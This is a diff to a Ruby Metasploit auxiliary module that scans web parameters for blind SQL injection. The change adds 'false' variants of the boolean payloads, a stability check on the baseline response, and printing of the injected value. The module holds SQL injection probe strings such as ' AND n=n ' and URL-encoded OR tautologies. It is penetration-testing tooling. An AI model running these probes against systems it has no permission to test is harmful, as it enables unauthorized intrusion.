@@ -58,7 +58,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		rnum=rand(10000)
 
-		valstr = [
+		inivalstr = [
 			[ 'numeric',
 			" AND #{rnum}=#{rnum} ",
 			" AND #{rnum}=#{rnum+1} "
@@ -88,6 +88,23 @@ class Metasploit3 < Msf::Auxiliary
 			"'%20OR%20'#{rnum}'%3D'#{rnum+1}'--"
 			]
 		]
+		
+		# Creating strings with true and false values
+		valstr = []
+		inivalstr.each do |vstr|
+			# With true values
+			valstr << vstr
+			# With false values, appending 'x' to real value 
+			valstr << ['False char '+vstr[0],'x'+vstr[1],'x'+vstr[2]]
+			# With false values, appending '0' to real value 
+			valstr << ['False num '+vstr[0],'0'+vstr[1],'0'+vstr[2]]
+		end
+		
+		#valstr.each do |v|
+		#	print_status("#{v[0]}")
+		#	print_status("#{v[1]}")
+		#	print_status("#{v[2]}")
+		#end
 
 		#
 		# Dealing with empty query/data and making them hashes.
@@ -114,27 +131,50 @@ class Metasploit3 < Msf::Auxiliary
 			cvars = queryparse(datastore['COOKIE'])
 		end
 
-
+		verifynr=2
+		
+		i=0
+		k=0
+		c=0
+		
+		normalres = nil
+		
+		verifynr.times do |j|
 		#SEND NORMAL REQUEST
-		begin
-			normalres = send_request_cgi({
-				'uri'  		=> datastore['PATH'],
-				'vars_get' 	=> gvars,
-				'method'   	=> http_method,
-				'ctype'		=> 'application/x-www-form-urlencoded',
-				'cookie'    => datastore['COOKIE'],
-				'data'      => datastore['DATA']
-			}, 20)
-		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-		rescue ::Timeout::Error, ::Errno::EPIPE
-		end
+			begin
+				normalres = send_request_cgi({
+					'uri'  		=> datastore['PATH'],
+					'vars_get' 	=> gvars,
+					'method'   	=> http_method,
+					'ctype'		=> 'application/x-www-form-urlencoded',
+					'cookie'    => datastore['COOKIE'],
+					'data'      => datastore['DATA']
+				}, 20)
+			rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+			rescue ::Timeout::Error, ::Errno::EPIPE
+			end
 
-		sigtxt = ""
-
-		if not normalres
-			print_error("No response")
-			return
+			if not normalres
+				print_error("No response")
+				return
+			else
+				if i==0
+					k = normalres.body.length
+					c = normalres.code.to_i
+				else
+					if k != normalres.body.length
+						print_error("Normal response body vary")
+						return					
+					end
+					if c != normalres.code.to_i
+						print_error("Normal response code vary")
+						return					
+					end
+				end
+			end
 		end
+		
+		print_status("[Normal response body: #{k}  code: #{c}]")
 
 		pinj = false	
 
@@ -142,11 +182,13 @@ class Metasploit3 < Msf::Auxiliary
 			#QUERY
 			if gvars
 				gvars.each do |key,value|
-					print_status("- Testing '#{tarr[0]}' Parameter #{key}:")
+					vprint_status("- Testing '#{tarr[0]}' Parameter #{key}:")
 
 					#SEND TRUE REQUEST
 					testgvars = queryparse(datastore['QUERY']) #Now its a Hash
 					testgvars[key] = testgvars[key]+tarr[1]
+					t = testgvars[key]
+					
 					begin
 						trueres = send_request_cgi({
 							'uri'  		=>  datastore['PATH'],
@@ -163,6 +205,7 @@ class Metasploit3 < Msf::Auxiliary
 					#SEND FALSE REQUEST
 					testgvars = queryparse(datastore['QUERY']) #Now its a Hash
 					testgvars[key] = testgvars[key]+tarr[2]
+					
 					begin
 						falseres = send_request_cgi({
 							'uri'  		=>  datastore['PATH'],
@@ -179,7 +222,8 @@ class Metasploit3 < Msf::Auxiliary
 					pinj = detection_a(normalres,trueres,falseres,tarr)
 					
 					if pinj
-						print_error("A Possible #{tarr[0]} Blind SQL Injection Found  #{datastore['PATH']} #{key}")
+						print_error("(A) Possible #{tarr[0]} Blind SQL Injection Found  #{datastore['PATH']} #{key}")
+						print_error("[#{t}]")
 						
 						report_web_vuln(
 							:host	=> ip,
@@ -204,7 +248,8 @@ class Metasploit3 < Msf::Auxiliary
 					pinj = detection_b(normalres,trueres,falseres,tarr)
 					
 					if pinj
-						print_error("B Possible #{tarr[0]} Blind SQL Injection Found  #{datastore['PATH']} #{key}")
+						print_error("(B) Possible #{tarr[0]} Blind SQL Injection Found  #{datastore['PATH']} #{key}")
+						print_error("[#{t}]")
 						
 						report_web_vuln(
 							:host	=> ip,
@@ -236,6 +281,7 @@ class Metasploit3 < Msf::Auxiliary
 					#SEND TRUE REQUEST
 					testpvars = queryparse(datastore['DATA']) #Now its a Hash
 					testpvars[key] = testpvars[key]+tarr[1]
+					t = testpvars[key]
 
 					pvarstr = ""
 					testpvars.each do |tkey,tvalue|
@@ -286,7 +332,8 @@ class Metasploit3 < Msf::Auxiliary
 					pinj = detection_a(normalres,trueres,falseres,tarr)
 					
 					if pinj
-						print_error("A Possible #{tarr[0]} Blind SQL Injection Found  #{datastore['PATH']} #{key}")
+						print_error("(A) Possible #{tarr[0]} Blind SQL Injection Found  #{datastore['PATH']} #{key}")
+						print_error("[#{t}]")
 						
 						report_web_vuln(
 							:host	=> ip,
@@ -311,7 +358,8 @@ class Metasploit3 < Msf::Auxiliary
 					pinj = detection_b(normalres,trueres,falseres,tarr)
 					
 					if pinj
-						print_error("B Possible #{tarr[0]} Blind SQL Injection Found  #{datastore['PATH']} #{key}")
+						print_error("(B) Possible #{tarr[0]} Blind SQL Injection Found  #{datastore['PATH']} #{key}")
+						print_error("[#{t}]")
 						
 						report_web_vuln(
 							:host	=> ip,
@@ -362,10 +410,10 @@ class Metasploit3 < Msf::Auxiliary
 						return false
 					end
 				else
-					print_status("NO False Response.")
+					vprint_status("NO False Response.")
 				end
 			else
-				print_status("Normal and True requests are different.")
+				vprint_status("Normal and True requests are different.")
 			end
 		else
 			print_status("No response.")
